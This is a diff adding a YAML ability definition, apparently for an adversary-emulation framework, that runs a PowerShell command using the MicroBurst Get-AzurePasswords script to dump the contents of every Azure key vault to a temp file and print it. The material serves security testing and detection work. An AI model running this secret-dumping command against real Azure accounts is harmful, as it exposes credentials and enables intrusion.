@@ -1,0 +1,25 @@
+---
+- id: 22dda265607e5cecaa9ee0f0f65b7dfd
+  name: Azure - Dump All Azure Key Vaults with Microburst
+  description: 'Upon successful execution of this test, the names, locations, and
+    contents of key vaults within an Azure account will be output to a file.
+
+    See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/'
+  tactic: credential-access
+  technique:
+    attack_id: T1555.006
+    name: 'Credentials from Password Stores: Cloud Secrets Management Stores'
+  platforms:
+    unknown:
+      psh:
+        command: import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1";
+          $Password = ConvertTo-SecureString -String "T1082Az" -AsPlainText -Force;
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential
+          -ArgumentList "None", $Password; Connect-AzureRmAccount -Credential $Credential;
+          Get-AzurePasswords -subscription 'None' > $env:temp\T1528Test1.txt; cat
+          $env:temp\T1528Test1.txt
+        payloads: []
+        cleanup: remove-item $env:temp\T1528Test1.txt -force -erroraction silentlycontinue
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
